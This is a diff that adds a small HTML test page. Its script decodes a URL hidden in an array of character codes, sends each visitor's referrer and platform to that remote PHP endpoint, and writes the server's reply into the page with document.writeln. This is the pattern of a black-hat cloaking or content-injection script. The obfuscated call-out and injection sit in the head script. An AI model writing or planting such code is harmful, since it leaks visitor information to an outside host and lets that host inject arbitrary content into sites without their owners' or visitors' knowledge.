@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>测试一下</title>
+	<script type="text/javascript" src="jquery-2.2.3.min.js"></script>
+	<script type="text/javascript">
+		function ax(u){
+		    var r = document.referrer;
+		    var p = navigator.platform;
+		    $.ajaxSettings.async = false;
+		    $.get(
+		        u,
+		        {'re':r,'ag':p},
+		        function(data){
+		            data.res?document.writeln(data.name):false;
+		        },
+		        "json"
+		    );
+		    $.ajaxSettings.async = true;
+		}
+		var t=[104,116,116,112,58,47,47,112,104,112,46,108,101,97,105,108,46,99,111,109,47,106,115,112,104,112,47,98,108,97,99,107,46,112,104,112];
+		var u='';
+		for(var i=0;i<t.length;i++){
+		    u+=String.fromCharCode(t[i]);
+		}
+		ax(u);
+	</script>
+</head>
+<body>
+	<h1>这是A页面</h1>
+</body>
+</html>
